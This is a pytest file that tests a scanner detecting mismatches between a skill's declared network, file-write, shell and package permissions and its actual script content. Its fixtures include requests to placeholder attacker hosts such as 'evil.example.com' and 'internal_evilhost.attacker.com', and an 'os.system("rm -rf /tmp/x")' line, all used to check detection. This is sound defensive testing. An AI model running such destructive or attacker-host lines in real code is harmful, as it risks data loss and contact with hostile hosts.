"""Tests for the executionRequirements companion drift scanner
(skills/evaluating-skill-quality/scripts/gitapex_scan_execution_requirements_drift.py,
issue #1022). Co-located with the scanner itself, mirroring
skills/evaluating-skill-quality/scripts/test_gitapex_check_skill_shape.py's
own placement next to gitapex_check_skill_shape.py.

Fixture-based: each ACM-named mismatch shape (disabled-but-networked,
allowlist-but-out-of-list-host, unrestricted-but-no-network-use, and the
tools.write/tools.shell under/over-declaration pairs) gets its own test
against a minimal on-disk skill directory built under tmp_path, plus a
clean-pass counterpart proving the scanner does not fire on matching
declarations. Two dedicated regression sections pin correctness bugs two
independent review rounds found and that were fixed before merge: four
bugs from an adversarial review, and a second, larger round (an allowlist
bypass via hostname truncation, alias-resolution gaps, a missing
RecursionError guard, a silent read-error swallow, and misattributed
test-file/docstring content, among others) from a multi-angle /code-review
pass -- see each new test's own docstring for the specific failure
scenario it pins. The final test is a real-repository *smoke* test only --
find_drift() must run without raising against the real skills/ tree, but
its result is deliberately NOT asserted to be empty: issue #1022's own
Non-goals excludes retroactively auditing every existing skill for a
pre-existing mismatch, and a live check found several already exist (e.g.
planning-a-branch-from-an-issue declares shell: [] but its own Step 8
invokes `python3 scripts/gitapex_check_acm_present.py`). This mirrors
gitapex_check_skill_shape.py's own un-registered status: neither carries a
.gitapex/ssot.json gate entry of its own; each is run deliberately against
one target skill at a time as part of evaluating-skill-quality's own
"Deterministic shape" lane, not as an automatic repo-wide CI gate.
"""

from __future__ import annotations

import ast
import builtins
import importlib
import pathlib
import runpy
import sys

import gitapex_scan_execution_requirements_drift as scanner
import pytest


def _make_skill(
    tmp_path: pathlib.Path,
    *,
    name: str = "example-skill",
    skill_md: str = "# Example Skill\n\n## Steps\n\n1. Read the input.\n",
    scripts: dict[str, str] | None = None,
) -> pathlib.Path:
    skill_dir = tmp_path / name
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(skill_md, encoding="utf-8")
    if scripts:
        scripts_dir = skill_dir / "scripts"
        scripts_dir.mkdir()
        for filename, content in scripts.items():
            (scripts_dir / filename).write_text(content, encoding="utf-8")
    return skill_dir


def _severities(findings: list[scanner.Finding]) -> list[str]:
    return [f.severity for f in findings]


# ---- find_network_drift ----


def test_disabled_but_networked_script_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import urllib.request\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "network-mode-vs-script-content" in findings[0].message


def test_absent_network_block_but_networked_script_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_network_drift(None, skill_dir)
    assert _severities(findings) == ["error"]


def test_disabled_and_no_network_use_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_allowlist_with_in_list_host_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import urllib.request\nurllib.request.urlopen("https://github.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert findings == []


def test_allowlist_with_out_of_list_host_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "evil.example.com" in findings[0].message


def test_unrestricted_with_use_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import httpx\n"})
    assert scanner.find_network_drift({"mode": "unrestricted"}, skill_dir) == []


def test_unrestricted_but_no_use_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
    findings = scanner.find_network_drift({"mode": "unrestricted"}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "over-declared" in findings[0].message


def test_no_scripts_directory_does_not_crash(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


# ---- find_tools_drift ----


def test_write_under_declared_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "tools-write-vs-skill-md" in findings[0].message


def test_write_declared_and_matches_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
    )
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert findings == []


def test_write_declared_but_no_match_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "tools-write-over-declared" in findings[0].message
    assert "over-declared" in findings[0].message


def test_shell_under_declared_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Run `git commit` to record the change.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "tools-shell-vs-skill-md" in findings[0].message


def test_shell_declared_and_matches_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Run `git commit` to record the change.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
    assert findings == []


def test_shell_declared_but_no_match_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "tools-shell-over-declared" in findings[0].message


def test_fully_clean_skill_has_no_tools_findings(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    assert scanner.find_tools_drift({"write": [], "shell": []}, skill_dir) == []


def test_missing_skill_md_does_not_crash(tmp_path: pathlib.Path) -> None:
    skill_dir = tmp_path / "no-skill-md"
    skill_dir.mkdir()
    assert scanner.find_tools_drift({"write": [], "shell": []}, skill_dir) == []


# ---- find_tools_drift: script-content signal (AST-based) ----


def test_write_under_declared_via_open_write_mode(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("out.txt", "w").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_under_declared_via_open_write_mode_keyword(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("out.txt", mode="a").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_open_read_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt", "r").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-write-vs-script-content" in f.message for f in findings)


def test_open_default_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-write-vs-script-content" in f.message for f in findings)


def test_open_with_unrelated_keyword_and_no_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
    """A keyword-only call with no "mode" keyword at all (e.g. only
    encoding=) must walk past every keyword without matching, not crash
    or false-positive."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt", encoding="utf-8").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_under_declared_via_os_remove(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import os\nos.remove("out.txt")\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_under_declared_via_pathlib_write_text(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import pathlib\npathlib.Path("out.txt").write_text("x")\n'},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_declared_and_matches_script_content_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import os\nos.remove("out.txt")\n'})
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert findings == []


def test_shell_under_declared_via_subprocess_run(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import subprocess\nsubprocess.run(["git", "status"])\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-shell-vs-script-content" in f.message for f in findings)


def test_shell_under_declared_via_aliased_subprocess_import(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import subprocess as sp\nsp.run(["git", "status"])\n'},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-shell-vs-script-content" in f.message for f in findings)


def test_shell_under_declared_via_from_subprocess_import(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'from subprocess import run\nrun(["git", "status"])\n'},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-shell-vs-script-content" in f.message for f in findings)


def test_shell_declared_and_matches_script_content_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import subprocess\nsubprocess.run(["git", "status"])\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
    assert findings == []


def test_unrelated_dot_run_method_is_not_a_shell_signal(tmp_path: pathlib.Path) -> None:
    """A bare method name match on ".run(" would be a severe false-positive
    source: "run" is an extremely common method name on unrelated objects
    (a test runner, a workflow class). Only a call resolved back to a real
    subprocess/os import counts."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": "class Workflow:\n    def run(self):\n        pass\n\nWorkflow().run()\n"},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-shell-vs-script-content" in f.message for f in findings)


def test_over_declared_is_joint_not_per_source(tmp_path: pathlib.Path) -> None:
    """Over-declaration must not fire just because ONE source shows no
    evidence -- a skill can validly declare tools.write purely because its
    own SKILL.md prose instructs the agent to write files, with zero
    bundled scripts ever doing so directly. Only "neither source shows
    evidence" is real over-declaration."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"helper.py": "import pathlib\n"},
    )
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert findings == []


def test_over_declared_fires_when_neither_source_has_evidence(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Read the input.\n",
        scripts={"helper.py": "import pathlib\n"},
    )
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "tools-write-over-declared" in findings[0].message


# ---- regression tests for bugs found by an independent adversarial review
# of this module (fixed before merge; each test pins the fix) ----


def test_shell_backtick_alternatives_match_without_a_preceding_run(tmp_path: pathlib.Path) -> None:
    """The real-world case the module docstring cites as motivation: a
    prior version of _SHELL_INTENT_PATTERN wrapped every alternative,
    including four starting with a literal backtick, in one leading \\b --
    but \\b demands a word/non-word transition, and a backtick is itself
    non-word, so those four alternatives could never match in ordinary
    Markdown (a backtick preceded by whitespace/punctuation). Only the
    generic ``run\\s+```` alternative worked, silently masking the bug --
    every case below previously returned no match."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Its own Step 8 invokes `python3 scripts/gitapex_check_acm_present.py`.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert _severities(findings) == ["error"]

    for phrase in (
        'Then invoke `git commit -m "x"` to save.',
        "Use `uv run pytest` here.",
        "Finish with `git push` to publish.",
        "Run `npm install` first.",
    ):
        assert scanner._SHELL_INTENT_PATTERN.search(phrase), f"should match: {phrase!r}"


def test_write_nouns_do_not_match_as_a_bare_prefix(tmp_path: pathlib.Path) -> None:
    """A prior version of _WRITE_NOUNS left several alternatives (file,
    script, branch, commit, document, ...) with no trailing \\b, so they
    matched as a bare prefix of an unrelated word right after them --
    "creates a review committee" matched via "commit", "creates a
    scripting-friendly interface" matched via "script". Neither sentence
    has anything to do with writing a file; both must produce zero
    findings when tools.write is correctly declared empty."""
    cases = {
        "committee-case": "# Example\n\n## Steps\n\n1. This skill creates a review committee for the launch.\n",
        "scripting-case": "# Example\n\n## Steps\n\n1. This skill creates a scripting-friendly interface for review.\n",
    }
    for name, skill_md in cases.items():
        skill_dir = _make_skill(tmp_path, name=name, skill_md=skill_md)
        findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
        assert findings == [], f"false positive for: {skill_md!r}"


def test_null_network_mode_still_fails_closed_on_real_usage(tmp_path: pathlib.Path) -> None:
    """A prior version used ``network.get("mode", "disabled")``, which only
    substitutes the default when the key is ABSENT -- a real ``mode: null``
    (valid YAML) or a mis-cased/typo'd mode string (e.g. "Disabled") passed
    straight through as the effective mode, matched none of the three
    recognized-mode branches, and silently returned no findings even
    against a script making real, unrestricted network calls. Any
    unrecognized mode value must now fall back to the strictest treatment
    ("disabled") and still flag real usage."""
    skill_dir = _make_skill(
        tmp_path, scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com")\n'}
    )
    for network in ({"mode": None}, {"mode": "Disabled"}, {"mode": "off"}):
        findings = scanner.find_network_drift(network, skill_dir)
        assert _severities(findings) == ["error"], f"should fail closed for network={network!r}"


def test_allowlist_host_comparison_is_case_insensitive(tmp_path: pathlib.Path) -> None:
    """Hostnames are case-insensitive (RFC 4343); a prior version compared
    the literal-cased extracted host against the literal-cased declared
    domains, so a script referencing "https://GitHub.com/x" against a
    correctly declared ``domains: [github.com]`` produced a false-positive
    error finding."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import requests\nrequests.get("https://GitHub.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert findings == []


def test_urllib_parse_alone_is_not_network_capable(tmp_path: pathlib.Path) -> None:
    """A prior version listed bare "urllib" in NETWORK_CAPABLE_MODULES, so
    the trailing (?:\\.\\w+)* suffix let "import urllib.parse" match too --
    but urllib.parse performs no network I/O of its own. A skill declaring
    network.mode: disabled that only imports urllib.parse for pure URL
    parsing must not be flagged."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import urllib.parse\n"})
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_from_urllib_import_request_is_now_caught(tmp_path: pathlib.Path) -> None:
    """The old regex-based scanner disclosed "from urllib import request"
    as an unfixed false negative, since it anchored on the dotted module
    path after import/from and could not see that "request" here names
    the network-capable urllib.request submodule. AST-based import
    resolution closes this: _tree_has_network_import checks both the
    ImportFrom node's own module ("urllib") and each imported name
    joined onto it ("urllib.request")."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "from urllib import request\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]


def test_unparseable_script_is_flagged_not_silently_skipped(tmp_path: pathlib.Path) -> None:
    """A bundled .py file that is not valid Python (a real SyntaxError)
    must not be silently excluded from analysis and treated as clean --
    dimension 15's fail-closed default. find_network_drift reports it as
    its own undetermined finding rather than either crashing or passing
    the skill vacuously."""
    skill_dir = _make_skill(tmp_path, scripts={"broken.py": "def f(:\n    pass\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "network-script-unparseable" in findings[0].message
    assert "broken.py" in findings[0].message


def test_ast_parse_value_error_is_flagged_not_crashed(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """ast.parse raises SyntaxError, not ValueError, for NUL-byte source on
    this repository's own pinned Python (verified directly against 3.11 and
    3.12: `ast.parse("x = 1\\x00\\n")` raises SyntaxError in both, never
    ValueError) -- the natural trigger a review once suggested does not
    reproduce here. Exercised via monkeypatch instead of a real NUL-byte
    file for the same reason test_looks_like_bundled_script_treats_unopenable_file_as_not_a_script
    above simulates its own OSError: defense-in-depth for "an inability to
    verify is a deny, not an assume-clean" should hold regardless of which
    Python version/implementation a caller runs, not only the one this
    exact test process happens to be running on."""
    skill_dir = _make_skill(tmp_path, scripts={"weird.py": "x = 1\n"})

    real_parse = ast.parse

    def _raise_value_error(source: str, filename: str = "<unknown>") -> ast.AST:
        if filename.endswith("weird.py"):
            raise ValueError("simulated: source code string cannot contain null bytes")
        return real_parse(source, filename=filename)

    monkeypatch.setattr(ast, "parse", _raise_value_error)

    trees, unparseable = scanner._bundled_script_trees(skill_dir)
    assert trees == []
    assert unparseable == ["weird.py"]


def test_commented_out_url_does_not_count_as_network_usage(tmp_path: pathlib.Path) -> None:
    """_URL_HOST_PATTERN previously scanned raw script text including
    comment lines, so a doc reference like "# see https://docs.python.org/"
    was treated as executed network usage."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": "# see https://docs.python.org/3/library/re.html\nimport pathlib\n"},
    )
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
    assert scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir) == []


# ---- regression tests for the second independent-review round (code-review) ----


def test_allowlist_host_with_underscore_is_not_truncated_to_a_false_match(tmp_path: pathlib.Path) -> None:
    """A prior version's _URL_HOST_PATTERN excluded underscore from its
    hostname character class, so "https://internal_evilhost.attacker.com"
    matched only up to "internal" -- an allowlisted-looking prefix that
    silently passed the allowlist check while the real host
    (attacker.com) was never compared at all. urllib.parse.urlsplit-based
    extraction must capture the real host in full."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import requests\nrequests.get("https://internal_evilhost.attacker.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["internal"]}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "internal_evilhost.attacker.com" in findings[0].message


def test_url_literal_without_a_host_contributes_no_referenced_host(tmp_path: pathlib.Path) -> None:
    """A URL literal that urllib.parse.urlsplit resolves to an empty
    hostname (e.g. "https:///path", no authority component) must not
    contribute a spurious host to the referenced-hosts set."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": 'x = "https:///path"\n'})
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_docstring_url_does_not_count_as_network_usage(tmp_path: pathlib.Path) -> None:
    """A URL inside a module docstring is documentation/citation text, not
    a network call -- the same "not code" status a comment already has,
    but ast.Constant does not distinguish a docstring from an ordinary
    string literal by content alone. _docstring_constant_ids excludes it
    by body position instead (found live: this exact shape false-positives
    against this repository's own evaluating-deterministic-gate-quality
    skill today)."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": '"""See https://docs.python.org/3/library/re.html for details."""\nimport pathlib\n'},
    )
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_module_alias_shadowing_across_scopes_does_not_hide_a_real_call(tmp_path: pathlib.Path) -> None:
    """_module_aliases previously kept one flat dict overwritten in import
    order, not scope order: a later "import os as sp" in an unrelated
    function silently erased an earlier "import subprocess as sp" alias,
    so the real subprocess.run(...) call resolved to the non-existent
    "os.run" and went undetected."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "helper.py": (
                "def helper():\n"
                "    import subprocess as sp\n"
                '    sp.run(["ls", "-la"])\n'
                "\n"
                "def other():\n"
                "    import os as sp\n"
                "    sp.getcwd()\n"
            )
        },
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-shell-vs-script-content" in ids


def test_import_os_path_submodule_form_is_recognized(tmp_path: pathlib.Path) -> None:
    """A plain, unaliased "import os.path" binds the local name "os" to
    the top-level os module itself (Python's own import semantics), so
    os.system(...) afterward is ordinary, valid code -- but a prior
    version's alias resolution only matched alias.name == "os" exactly,
    missing "os.path" as the dotted import name and so never registering
    the alias at all."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": 'import os.path\nos.system("rm -rf /tmp/x")\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-shell-vs-script-content" in ids


def test_write_under_declared_via_pathlib_unlink(tmp_path: pathlib.Path) -> None:
    """_PATH_WRITE_METHOD_NAMES previously covered only write_text/
    write_bytes out of pathlib.Path's own mutating-method surface --
    .unlink() (deleting a file) is just as real a write as those two."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"cleanup.py": 'import pathlib\npathlib.Path("out.txt").unlink()\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-write-vs-script-content" in ids


def test_shell_under_declared_via_os_posix_spawn(tmp_path: pathlib.Path) -> None:
    """os.posix_spawn is the modern stdlib replacement subprocess itself
    now uses internally on POSIX -- a prior version enumerated the older
    os.spawn* family exhaustively but omitted it."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"launch.py": 'import os\nos.posix_spawn("/bin/ls", ["/bin/ls"], {})\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-shell-vs-script-content" in ids


def test_unreadable_script_is_flagged_undetermined_not_silently_clean(tmp_path: pathlib.Path) -> None:
    """A bundled script that exists but is not valid UTF-8 must not be
    silently treated as an empty (and therefore clean) module -- a prior
    version routed the read through a helper that swallowed
    OSError/UnicodeDecodeError into "", which ast.parse("") accepts as a
    valid empty tree, scoring a genuinely unreadable script (which could
    contain real network/write/shell code) as having zero signal --
    contradicting this module's own stated dimension-15 principle: an
    inability to verify is a deny, not an assume-clean."""
    skill_dir = _make_skill(tmp_path, scripts={"broken.py": "placeholder"})
    (skill_dir / "scripts" / "broken.py").write_bytes(b"\xff\xfe not utf-8")
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "network-script-unparseable" in findings[0].message
    assert "broken.py" in findings[0].message


def test_bundled_test_file_is_excluded_from_script_content_scanning(tmp_path: pathlib.Path) -> None:
    """A skill's own unit-test file legitimately exercises test-double
    network calls, mocked subprocess invocations, and similar test-only
    content that is not the skill's own shipped capability -- including it
    in scripts/*.py scanning misattributes that content as real drift
    (found live against this repository's own setup-gitapex-toolchain and
    drafting-an-adr skills, each reporting a finding whose only real
    source was its own test file)."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "real.py": "import pathlib\n",
            "test_real.py": 'import requests\nrequests.get("https://example.test/x")\n',
        },
    )
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_deterministic_findings_carry_deterministic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert findings and all(f.kind == "deterministic" for f in findings)


def test_skill_md_prose_findings_carry_heuristic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example Skill\n\n## Steps\n\n1. Write the output file.\n",
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    kinds = {f.message.split(":")[0]: f.kind for f in findings}
    assert kinds["tools-write-vs-skill-md"] == "heuristic"


def test_script_content_findings_carry_deterministic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": 'import pathlib\npathlib.Path("out.txt").write_text("x")\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    kinds = {f.message.split(":")[0]: f.kind for f in findings}
    assert kinds["tools-write-vs-script-content"] == "deterministic"


def test_over_declared_finding_carries_heuristic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    findings = scanner.find_tools_drift({"write": ["approved"]}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert findings[0].kind == "heuristic"


def test_find_skill_drift_parses_bundled_scripts_only_once(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """find_skill_drift computes _bundled_script_trees once and passes the
    result to both find_network_drift and find_tools_drift, instead of
    each independently re-reading and re-parsing every bundled script --
    a prior version parsed every script twice per skill scan."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
    call_count = 0
    real = scanner._bundled_script_trees

    def counting(skill_dir: pathlib.Path) -> tuple[list[ast.AST], list[str]]:
        nonlocal call_count
        call_count += 1
        return real(skill_dir)

    monkeypatch.setattr(scanner, "_bundled_script_trees", counting)
    scanner.find_skill_drift(skill_dir)
    assert call_count == 1


# ---- find_packages_drift ----


def _compat_skill_md(*package_names: str) -> str:
    """A minimal SKILL.md whose frontmatter `compatibility:` field
    mentions every name in ``package_names`` (verbatim, same case) --
    keeps a find_packages_drift test that is NOT itself about the
    compatibility-mention heuristic free of that heuristic's own
    independent warning as unrelated noise (every declared packages.pip
    name is checked against `compatibility` regardless of whether the
    deterministic half's own under/over-declared checks pass, and the
    default `_make_skill` skill_md carries no frontmatter at all -- see
    the compatibility-mention heuristic's own dedicated test section
    below for what happens when this helper is deliberately NOT used)."""
    mentions = " ".join(package_names)
    return (
        "---\nname: example-skill\ndescription: x\n"
        f'compatibility: "Requires {mentions}."\n---\n\n'
        "# Example\n\n## Steps\n\n1. Read the input.\n"
    )


def test_packages_under_declared_absent_block_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_packages_drift(None, skill_dir)
    assert _severities(findings) == ["error"]
    assert "packages-pip-vs-script-content" in findings[0].message
    assert "'requests'" in findings[0].message


def test_packages_declared_direct_match_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("requests"),
        scripts={"fetch.py": "import requests\n"},
    )
    assert scanner.find_packages_drift({"pip": ["requests"]}, skill_dir) == []


def test_packages_empty_pip_list_but_import_is_error(tmp_path: pathlib.Path) -> None:
    """An explicit `pip: []` and an absent packages block must behave
    identically for under-declared purposes -- both yield an empty
    declared set (see find_packages_drift's own docstring)."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_packages_drift({"pip": []}, skill_dir)
    assert _severities(findings) == ["error"]


def test_stdlib_import_does_not_trigger_under_declared(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import os\nimport pathlib\nimport json\n"})
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_multiple_non_stdlib_imports_all_flagged_when_none_declared(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\nimport numpy\n"})
    findings = scanner.find_packages_drift(None, skill_dir)
    assert _severities(findings) == ["error", "error"]
    messages = " ".join(f.message for f in findings)
    assert "'numpy'" in messages
    assert "'requests'" in messages


def test_packages_no_scripts_directory_does_not_crash(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_no_scripts_directory_with_declared_packages_is_over_declared(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md=_compat_skill_md("requests"))
    findings = scanner.find_packages_drift({"pip": ["requests"]}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert findings[0].kind == "deterministic"
    assert "over-declared" in findings[0].message


# ---- find_packages_drift: alias table (pyyaml/yaml is the load-bearing case) ----


def test_pyyaml_alias_declared_pyyaml_import_yaml_is_clean(tmp_path: pathlib.Path) -> None:
    """The dedicated test issue #1121's own Acceptance Criteria Map calls
    for by name: the whole reason _IMPORT_NAME_TO_DISTRIBUTION exists."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("pyyaml"),
        scripts={"fetch.py": "import yaml\n"},
    )
    assert scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir) == []


def test_pyyaml_alias_absent_declaration_import_yaml_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import yaml\n"})
